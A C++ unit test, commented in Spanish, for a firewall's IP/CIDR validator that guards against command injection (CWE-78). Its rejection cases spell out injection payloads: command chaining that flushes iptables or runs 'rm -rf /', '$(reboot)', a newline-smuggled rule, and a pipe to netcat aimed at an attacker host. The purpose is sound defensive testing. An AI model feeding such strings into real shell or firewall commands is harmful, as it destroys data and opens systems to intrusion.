// test_ip_cidr_validator.cpp — DAY190 · DEBT-AUTONOMY-REACTOR-CWE78-001
// Test STANDALONE del validador compartido. Dos ejes ortogonales:
//   (A) SEGURIDAD: rechaza metacaracteres de shell, \n/\r/\t, y el bypass
//       histórico "1.2.3.4/24\nadd evil ..." (la propiedad que cierra CWE-78).
//   (B) ESTRUCTURAL: acepta IP/CIDR legítimos, rechaza prefijos fuera de rango.
// Sin gtest: macro CHECK propio (compila en cualquier sitio, como add_newline_guard).
#include "firewall/ip_cidr_validator.hpp"
#include <cstdio>
#include <string>

using mldefender::firewall::is_valid_ip_cidr;

static int g_fail = 0;
static int g_checks = 0;
#define CHECK(cond) do { ++g_checks; if (!(cond)) { \
    std::printf("  FAIL L%d: %s\n", __LINE__, #cond); ++g_fail; } } while (0)

#define REJECT(s) CHECK(is_valid_ip_cidr(std::string(s)) == false)
#define ACCEPT(s) CHECK(is_valid_ip_cidr(std::string(s)) == true)

int main() {
    std::printf("=== test_ip_cidr_validator (DAY190 CWE-78) ===\n");

    // ── (A) SEGURIDAD — vectores de ataque DEBEN ser rechazados ─────────────
    REJECT("1.2.3.0/24; iptables -F");            // separador de comando
    REJECT("1.2.3.4/24\nadd evil 6.6.6.6");       // bypass histórico (newline)
    REJECT("1.2.3.4\nadd evil 6.6.6.6");          // newline sin slash
    REJECT("1.2.3.4\r\n6.6.6.6");                  // CRLF
    REJECT("1.2.3.4\t6.6.6.6");                    // tab
    REJECT("$(reboot)");                           // sustitución de comando
    REJECT("`reboot`");                            // backticks
    REJECT("1.2.3.4 | nc attacker 4444");          // pipe + espacio
    REJECT("1.2.3.4 -j ACCEPT");                   // espacio + flag (arg injection)
    REJECT("10.0.0.0/8&&rm -rf /");                // encadenado
    REJECT("10.0.0.0/8 ");                         // espacio final
    REJECT(" 10.0.0.0/8");                         // espacio inicial

    // ── (B) ESTRUCTURAL — legítimos aceptados ───────────────────────────────
    ACCEPT("10.0.0.0/8");
    ACCEPT("172.16.0.0/12");
    ACCEPT("192.168.0.0/16");
    ACCEPT("127.0.0.1");                           // host sin máscara
    ACCEPT("8.8.8.8/32");
    ACCEPT("::1");                                 // IPv6 loopback
    ACCEPT("2001:db8::/32");                       // IPv6 CIDR
    ACCEPT("fe80::1/128");

    // ── (B) ESTRUCTURAL — malformados rechazados (corrección, no seguridad) ─
    REJECT("10.0.0.0/33");                         // prefijo v4 fuera de rango
    REJECT("2001:db8::/129");                      // prefijo v6 fuera de rango
    REJECT("999.1.1.1");                           // octeto inválido
    REJECT("10.0.0.0//8");                         // doble slash
    REJECT("10.0.0.0/8/8");                        // doble slash separado
    REJECT("10.0.0.0/");                           // slash sin prefijo
    REJECT("");                                    // vacío
    REJECT("notanip");                             // basura
    // Comportamiento DOCUMENTADO (behavior-preserving, no endorsement): "/008" son
    // 3 dígitos que parsean a 8 (en rango) → aceptado. inet_pton ya rechaza ceros a
    // la izquierda EN LOS OCTETOS; el prefijo no los normaliza. Si en el futuro se
    // quiere endurecer (rechazar ceros a la izquierda en el prefijo), es un cambio
    // de comportamiento que va con su propio test, no aquí.
    ACCEPT("10.0.0.0/008");                         // 3 dígitos, valor 8 en rango → aceptado

    std::printf("--- %d checks, %d fallos ---\n", g_checks, g_fail);
    if (g_fail == 0) std::printf("=== PASS: validador cierra CWE-78 + corrección estructural ===\n");
    else             std::printf("=== FAIL: %d aserciones rotas ===\n", g_fail);
    return g_fail == 0 ? 0 : 1;
}
